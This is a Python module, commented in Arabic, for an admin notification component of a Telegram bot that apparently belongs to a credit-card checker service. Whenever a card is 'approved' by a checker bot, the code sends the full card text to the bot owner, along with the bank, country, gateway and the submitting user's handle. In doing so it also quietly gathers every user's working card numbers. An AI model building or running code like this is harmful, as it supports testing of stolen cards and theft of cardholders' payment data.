"""
نظام الإشعارات للمدير
"""
import logging
import os
from datetime import datetime
from telegram import Bot
from typing import Dict

logger = logging.getLogger(__name__)

OWNER_ID = int(os.getenv('OWNER_ID', 0))

class Notifier:
    def __init__(self, bot: Bot):
        self.bot = bot
        self.owner_id = OWNER_ID
    
    async def notify_approved_card(self, user_info: Dict, card_result: Dict):
        """إرسال إشعار للمدير عند نجاح بطاقة"""
        try:
            card_text = card_result.get('card_text', '')
            response = card_result.get('response', '')
            
            # استخراج معلومات إضافية
            info = self._extract_info(response)
            
            # تنسيق الرسالة
            text = "✅ **بطاقة ناجحة!**\n\n"
            
            # معلومات المستخدم
            username = user_info.get('username', '')
            telegram_id = user_info.get('telegram_id', '')
            
            if username:
                text += f"👤 المستخدم: @{username}\n"
            else:
                text += f"👤 المستخدم: {telegram_id}\n"
            
            # معلومات البطاقة
            text += f"💳 البطاقة: `{card_text}`\n"
            
            if 'bank' in info:
                text += f"🏦 البنك: {info['bank']}\n"
            if 'country' in info:
                text += f"🌍 الدولة: {info['country']}\n"
            if 'gateway' in info:
                text += f"🔗 Gateway: {info['gateway']}\n"
            
            # معلومات إضافية
            text += f"🤖 البوت: {user_info.get('checker_bot', 'غير محدد')}\n"
            text += f"⏰ الوقت: {datetime.now().strftime('%I:%M %p')}\n"
            
            # إرسال الإشعار
            await self.bot.send_message(
                chat_id=self.owner_id,
                text=text,
                parse_mode='Markdown'
            )
            
            logger.info(f"تم إرسال إشعار للمدير: {card_text}")
            
        except Exception as e:
            logger.error(f"خطأ في إرسال الإشعار: {e}")
    
    def _extract_info(self, response: str) -> Dict[str, str]:
        """استخراج معلومات من الرد"""
        import re
        
        info = {}
        
        # استخراج البنك
        bank_match = re.search(r'Bank[:\s]+([^\n]+)', response, re.IGNORECASE)
        if bank_match:
            info['bank'] = bank_match.group(1).strip()
        
        # استخراج الدولة
        country_match = re.search(r'Country[:\s]+([^\n]+)', response, re.IGNORECASE)
        if country_match:
            info['country'] = country_match.group(1).strip()
        
        # استخراج Gateway
        gateway_match = re.search(r'Gateway[:\s]+([^\n]+)', response, re.IGNORECASE)
        if gateway_match:
            info['gateway'] = gateway_match.group(1).strip()
        
        return info
    
    async def notify_user_added(self, user_info: Dict):
        """إشعار عند إضافة مستخدم جديد"""
        try:
            text = "👤 **مستخدم جديد مضاف!**\n\n"
            text += f"المعرّف: {user_info['telegram_id']}\n"
            text += f"البوت: {user_info['checker_bot']}\n"
            
            await self.bot.send_message(
                chat_id=self.owner_id,
                text=text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"خطأ في إرسال إشعار: {e}")
    
    async def notify_error(self, error_message: str):
        """إشعار عند حدوث خطأ"""
        try:
            text = f"⚠️ **خطأ:**\n\n{error_message}"
            
            await self.bot.send_message(
                chat_id=self.owner_id,
                text=text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"خطأ في إرسال إشعار الخطأ: {e}")
